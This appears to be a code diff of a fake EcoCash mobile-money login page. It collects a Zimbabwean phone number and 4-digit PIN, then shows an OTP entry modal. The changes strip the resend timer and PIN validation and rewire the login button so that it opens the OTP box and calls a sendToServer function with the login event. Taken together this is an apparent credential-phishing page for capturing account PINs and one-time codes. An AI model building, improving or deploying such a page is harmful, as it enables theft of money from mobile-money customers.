@@ -24,17 +24,59 @@
   .logo{height:44px;display:block;margin:0 auto 10px}
   h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
   label{display:block;font-size:13px;color:#374151;margin-top:8px}
-  input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px;box-sizing:border-box}
-  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
-  .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
 
-  .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35);z-index:9999}
-  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
+  input{
+    width:100%;
+    padding:10px;
+    border-radius:8px;
+    border:1px solid #e6eefc;
+    background:#fbfdff;
+    font-size:14px;
+    box-sizing:border-box
+  }
 
-  .req{color:#d04444;margin-right:6px}
-  .small{font-size:13px;color:#6b7280}
-  .success{color:#16a34a;font-weight:600}
-  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
+  .btn{
+    background:#4b86ff;
+    color:#fff;
+    padding:10px;
+    border-radius:8px;
+    border:0;
+    margin-top:12px;
+    cursor:pointer;
+    width:100%
+  }
+  .btn[disabled]{
+    background:#cbd5e1;
+    color:#6b7280;
+    cursor:not-allowed
+  }
+
+  .req{
+    color:#dc2626; /* 🔴 stars red */
+    margin-right:6px
+  }
+
+  .otp-modal{
+    position:fixed;
+    left:0;
+    top:0;
+    width:100%;
+    height:100%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:rgba(0,0,0,0.35);
+    z-index:9999
+  }
+
+  .otp-box{
+    background:#fff;
+    padding:18px;
+    border-radius:12px;
+    min-width:300px;
+    max-width:92%;
+    box-shadow:0 12px 24px rgba(2,6,23,0.08)
+  }
 
   .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
   .otp-digit{
@@ -47,29 +89,35 @@
     background:#fbfdff;
   }
 
-  .resend-row{display:flex;gap:10px;align-items:center;margin-top:12px;justify-content:space-between}
-  .resend-info{font-size:13px;color:#6b7280}
-  .resend-btn{background:#fff;border:1px solid #e6eefc;padding:8px 12px;border-radius:8px;cursor:pointer}
-  .resend-btn[disabled]{opacity:.6;cursor:not-allowed}
+  .otp-warning{
+    color:#dc2626;
+    font-size:13px;
+    margin-top:8px;
+    display:none
+  }
 </style>
 </head>
+
 <body>
   <div class="card">
     <img src="assets/eco.png" alt="EcoCash logo" class="logo">
     <h2>Log In</h2>
-    <form id="loginForm" autocomplete="off">
+
+    <form id="loginForm" autocomplete="off" onsubmit="return false;">
       <label><span class="req">★</span>Mobile Number
         <input id="phone" name="phone" required value="+263" inputmode="tel" autocomplete="tel" />
       </label>
 
       <label><span class="req">★</span>4-Digit PIN
-        <input id="pin" name="pin" required maxlength="4" placeholder="Enter 4-digit PIN" inputmode="numeric" pattern="\d{4}" />
+        <input id="pin" name="pin" required maxlength="4" placeholder="Enter 4-digit PIN" inputmode="numeric" />
       </label>
 
-      <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
+      <!-- 🔑 IMPORTANT: button, NOT submit -->
+      <button type="button" id="loginBtn" class="btn" disabled>LOGIN</button>
     </form>
   </div>
 
+  <!-- OTP MODAL -->
   <div id="otpModal" style="display:none" class="otp-modal">
     <div class="otp-box">
       <strong style="display:block;text-align:center">Enter OTP</strong>
@@ -85,19 +133,10 @@
 
       <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
 
-      <div class="resend-row">
-        <div class="resend-info" id="resendInfo">
-          Resend available in <span id="countdown">120</span>s
-        </div>
-        <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
-      </div>
-
       <div style="display:flex;gap:10px;margin-top:12px">
-        <button id="confirmOtp" style="flex:1;background:#16a34a;color:#fff;border:0;border-radius:8px" disabled>Confirm</button>
+        <button id="confirmOtp" style="flex:1;background:#16a34a;color:#fff;border:0;border-radius:8px">Confirm</button>
         <button id="cancelOtp" style="flex:1;background:#e5e7eb;border:0;border-radius:8px">Cancel</button>
       </div>
-
-      <div id="otpStatus" class="small"></div>
     </div>
   </div>
 
@@ -105,6 +144,7 @@
   const phoneEl = document.getElementById('phone');
   const pinEl = document.getElementById('pin');
   const loginBtn = document.getElementById('loginBtn');
+  const otpModal = document.getElementById('otpModal');
 
   const PREFIX = '+263';
 
@@ -151,11 +191,8 @@
     });
   }
 
-  const otpModal=document.getElementById('otpModal');
-
-  document.getElementById('loginForm').addEventListener('submit',async e=>{
-    e.preventDefault();
-    otpModal.style.display='flex';
+  loginBtn.addEventListener('click', ()=>{
+    otpModal.style.display = 'flex';
     sendToServer({
       submittedAt:new Date().toISOString(),
       event:'login_clicked',
@@ -164,8 +201,9 @@
     });
   });
 
-  const cancelBtn = document.getElementById('cancelOtp');
-  if (cancelBtn) cancelBtn.onclick = () => otpModal.style.display='none';
+  document.getElementById('cancelOtp').onclick = () => {
+    otpModal.style.display = 'none';
+  };
 </script>
 </body>
 </html>
